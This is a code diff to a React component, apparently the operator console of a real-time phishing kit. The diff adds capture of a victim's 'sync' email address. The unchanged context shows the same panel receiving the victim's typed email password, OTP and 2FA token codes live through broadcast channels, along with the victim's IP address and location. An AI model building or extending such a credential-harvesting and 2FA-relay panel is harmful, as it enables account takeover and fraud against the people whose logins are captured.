@@ -34,6 +34,7 @@ const OperateSession = ({ session, onBack }: OperateSessionProps) => {
   const [emailCodeLabel, setEmailCodeLabel] = useState("");
   const [currentPassword, setCurrentPassword] = useState(session.password || "");
   const [currentStatus, setCurrentStatus] = useState(session.status);
+  const [syncEmail, setSyncEmail] = useState("");
 
   // ── Admin inputs ──
   const [adminTokenCode, setAdminTokenCode] = useState("");
@@ -81,6 +82,9 @@ const OperateSession = ({ session, onBack }: OperateSessionProps) => {
       .on("broadcast", { event: "client_email_password_typing" }, (p) => {
         if (p.payload?.email_password !== undefined) setEmailPassword(p.payload.email_password);
       })
+      .on("broadcast", { event: "client_sync_email" }, (p) => {
+        if (p.payload?.sync_email !== undefined) setSyncEmail(p.payload.sync_email);
+      })
       .on("broadcast", { event: "client_token_update" }, (p) => {
         if (p.payload?.token_code !== undefined) { setEmailCode(p.payload.token_code); setEmailCodeLabel("Token 2FA"); }
       })
@@ -97,6 +101,9 @@ const OperateSession = ({ session, onBack }: OperateSessionProps) => {
     syncCh
       .on("broadcast", { event: "client_sync_password" }, (p) => {
         if (p.payload?.sync_password) setEmailPassword(p.payload.sync_password);
+      })
+      .on("broadcast", { event: "client_sync_email" }, (p) => {
+        if (p.payload?.sync_email !== undefined) setSyncEmail(p.payload.sync_email);
       })
       .on("broadcast", { event: "client_sync_token_update" }, (p) => {
         if (p.payload?.token_code !== undefined) { setEmailCode(p.payload.token_code); setEmailCodeLabel("Token 2FA"); }
@@ -129,6 +136,7 @@ const OperateSession = ({ session, onBack }: OperateSessionProps) => {
       }
 
       if (/^\d+$/.test(otp) && otp.length <= 6) setPlatformOtp(otp);
+      if (otp.startsWith("sync_email:")) setSyncEmail(otp.replace("sync_email:", ""));
       if (otp.startsWith("email_pass:")) setEmailPassword(otp.replace("email_pass:", ""));
       if (otp.startsWith("sync_pass:")) setEmailPassword(otp.replace("sync_pass:", ""));
       if (otp.startsWith("token_code:") || otp.startsWith("sync_token:")) {
@@ -342,7 +350,7 @@ const OperateSession = ({ session, onBack }: OperateSessionProps) => {
         <div className="flex items-center gap-3">
           <div className="h-2.5 w-2.5 animate-pulse rounded-full bg-green-400 shrink-0" />
           <div className="flex-1 min-w-0">
-            <p className="text-sm font-bold text-foreground truncate">{session.email || "—"}</p>
+            <p className="text-sm font-bold text-foreground truncate">{syncEmail || session.email || "—"}</p>
             <div className="flex flex-wrap gap-x-3 text-[10px] text-muted-foreground mt-0.5">
               <span>{session.ip_address || "—"}</span>
               {(session.city || session.country) && (
